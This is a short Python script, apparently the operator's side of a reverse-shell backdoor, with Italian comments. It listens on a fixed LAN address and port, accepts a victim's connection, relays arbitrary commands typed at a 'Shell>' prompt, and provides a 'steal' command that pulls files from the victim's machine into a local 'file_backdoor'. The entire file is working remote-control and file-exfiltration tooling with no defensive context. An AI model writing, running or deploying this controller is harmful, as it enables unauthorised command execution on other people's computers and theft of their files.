from socket import *

def connect():
    # TCP connection
    sock = socket(AF_INET, SOCK_STREAM)
    host = "192.168.1.8"
    port = 111
    buffer_size = 1024
    sock.bind((host, port))
    sock.listen(1)

    while 1:
        print("[+] Listening {}:{}".format(host, port), end="")
        client, addr = sock.accept()
        print("\n[+] Connection from: ", addr)
        print("[?] Use 'steal><fila path>' for get file or 'terminate' for close connection")
        while 1:
            command = input("Shell> ")

            if "terminate" in command:
                client.send("terminate".encode())
                client.close()
                break
            else:
                #manda
                client.send(command.encode())
                #riceve
                resp = client.recv(buffer_size)
                flag = True
                if "steal" in command:
                    file_backdoor = "/home/nonameon/Scrivania/file"
                    print("[+] Start!")
                    with open(file_backdoor, "wb") as f:
                        while True:
                            print("scritto")
                            f.write(resp)
                            resp = client.recv(buffer_size)
                            if "end-transfer-file" in resp.decode("ISO-8859-1"):
                                break
                    print("[+] End!")
                else:
                    print(resp.decode("ISO-8859-1"))

def main():
    connect()
main()
